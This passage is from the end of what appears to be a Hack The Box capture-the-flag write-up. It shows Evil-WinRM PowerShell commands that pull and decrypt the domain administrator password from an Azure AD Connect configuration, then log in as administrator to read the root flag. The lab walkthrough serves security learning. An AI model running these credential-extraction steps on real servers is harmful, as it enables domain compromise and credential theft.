<span class="code-line">*Evil-WinRM* PS C:&gt; $username = select-xml -Content $config -XPath &quot;//parameter[@name=&#39;forest-login-user&#39;]&quot; | select @{Name = &#39;Username&#39;; Expression = {$_.node.InnerXML}}</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $password = select-xml -Content $decrypted -XPath &quot;//attribute&quot; | select @{Name = &#39;Password&#39;; Expression = {$_.node.InnerXML}}</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; Write-Host (&quot;Domain: &quot; + $domain.Domain)</span>
<span class="code-line">Domain: MEGABANK.LOCAL</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; Write-Host (&quot;Username: &quot; + $username.Username)</span>
<span class="code-line">Username: administrator</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; Write-Host (&quot;Password: &quot; + $password.Password)</span>
<span class="code-line">Password: d0m@in4dminyeah!</span>
<span class="code-line"></code></pre></div>

<p>We connect to the box with the domain admin account and retrieve the root flag.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>root@kalili:~/tools/github/evil-winrm# ruby evil-winrm.rb -u administrator -i 10.10.10.172 -p &#39;d0m@in4dminyeah!&#39;</span>
<span class="code-line"></span>
<span class="code-line">Evil-WinRM shell v1.8</span>
<span class="code-line"></span>
<span class="code-line">Info: Establishing connection to remote endpoint</span>
<span class="code-line"></span>
<span class="code-line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cat ../Desktop/root.txt</span>
<span class="code-line">12909612d25c8dcf6e5a07d1a804a0bc</span>
<span class="code-line"></code></pre></div>

<h1 id="wrapping-up">Wrapping up</h1>
<p>The user part of the box was classical and quit easy. The root part allow me to
learn a few things about Azure, Azure AD and how the Password Hash
Synchronisation works.</p>
    </div>

      <footer>
          <div>
            <b>Previous article:</b> <a href="../../2020/06/htb-nest.html"> HTB: Nest </a>
          </div>
          <div>
            <b>Next article:</b> <a href="../../2020/06/htb-servmon.html"> HTB: ServMon </a>
          </div>

<div class="social-buttons">


</div>
      </footer>


    <div class="clearfix"></div>

</article>
<!-- /.entry -->
            </div>
        </section>

        <aside class="sidebar pure-u-7-24">
            <div class="l-box">
    <section class="module menuitems">
        <h3 class="title module-title">Menu</h3>

        <ul>
                <li>
                    <span class= "icons icons-archives"></span>
                    <a href="/archives">archives</a>
                </li>
                <li>
                    <span class= "icons icons-feeds"></span>
                    <a href="/feeds/all.atom.xml">feeds</a>
                </li>
                <li>
                    <span class= "icons icons-links"></span>
                    <a href="/pages/links.html">links</a>
                </li>
        </ul>
    </section>

    <section class="module social">
        <h3 class="title module-title">Social</h3>

        <ul>
                <li>
                    <span class= "icons icons-github"></span>
                    <a href="https://github.com/maggick">github</a>
                </li>
                <li>
                    <span class= "icons icons-twitter"></span>
                    <a href="https://twitter.com/maggick_fr">twitter</a>
                </li>
                <li>
                    <span class= "icons icons-stackoverflow"></span>
                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
                </li>
        </ul>
    </section>


<section class="module tagcloud">
    <h3 class="title module-title">Tags</h3>

    <ul>
            <li class="tag tag-3">
              <a href="../../tag/openadmin.html">openAdmin</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/dll.html">DLL</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/pypi.html">pypi</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/bolt-cms.html">bolt CMS</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/upload.html">Upload</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/memcache.html">memcache</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nmap.html">nmap</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/vulnhub.html">vulnhub</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/bludit.html">bludit</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nosql.html">NoSQL</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/misc.html">misc</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/gitlab.html">gitlab</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/azure.html">Azure</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/linux.html">linux</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/umbraco.html">umbraco</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/tomcat.html">tomcat</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/jackson.html">jackson</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/javascript.html">javascript</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/webassembly.html">webassembly</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/laravel.html">laravel</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/vnc.html">VNC</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ldap.html">LDAP</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/boot2root.html">boot2root</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/python.html">python</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/re.html">RE</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/deserialization.html">deserialization</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/xss.html">XSS</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/git.html">git</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/php.html">php</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/suid.html">SUID</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/vb.html">VB</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/core-dump.html">core dump</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cloudme.html">cloudme</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/chef.html">chef</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/docker.html">docker</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/web.html">web</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/lxc.html">lxc</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/crypto.html">Crypto</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/adb.html">adb</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/programming.html">programming</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/msfvenom.html">msfvenom</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cewl.html">cewl</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/path.html">PATH</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/phishing.html">phishing</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/vault.html">vault</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/rsa.html">RSA</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/msfconsole.html">msfconsole</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/xxe.html">XXE</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/php-filter.html">php filter</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ssti.html">SSTI</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/yaml.html">YAML</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nft.html">NFT</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/sqli.html">SQLi</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/cve.html">CVE</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/impacket.html">impacket</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/challenge.html">challenge</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/openbsd.html">OpenBSD</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/openemr.html">openEMR</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/exploit.html">exploit</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/print-nightmare.html">print nightmare</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/sudo.html">sudo</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/capabilities.html">capabilities</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/devops.html">devops</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/logrotate.html">logrotate</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/enumeration.html">enumeration</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/chisel.html">chisel</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/blog.html">blog</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/lfi.html">LFI</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/android.html">Android</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/journalctl.html">journalctl</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/phs.html">PHS</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/windows.html">windows</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/metasploit.html">metasploit</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/jwt.html">jwt</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/iot.html">IOT</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nostromo.html">nostromo</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ssrf.html">SSRF</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/ctf.html">CTF</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/net.html">.NET</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/reverse.html">reverse</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/lxd.html">lxd</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/composer.html">composer</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/teamviewer.html">teamviewer</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nano.html">nano</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/htb.html">HTB</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/splunk.html">Splunk</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/winrm.html">winrm</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/adminer.html">adminer</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/smb.html">SMB</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/zip.html">zip</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/strapi.html">strapi</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/john.html">john</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/security.html">security</a>
            </li>
    </ul>
</section>

            </div>
        </aside>
    </div>

    <section class="pure-g-r footer">
<div class="pure-u-2-3 copyright">
    <p class="l-box">
        The content of this blog in under
        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.

        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
    </p>
</div>

<div class="pure-u-1-3 credits">
    <p class="l-box">
        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
    </p>
</div>    </section>


</div>
</body>
</html>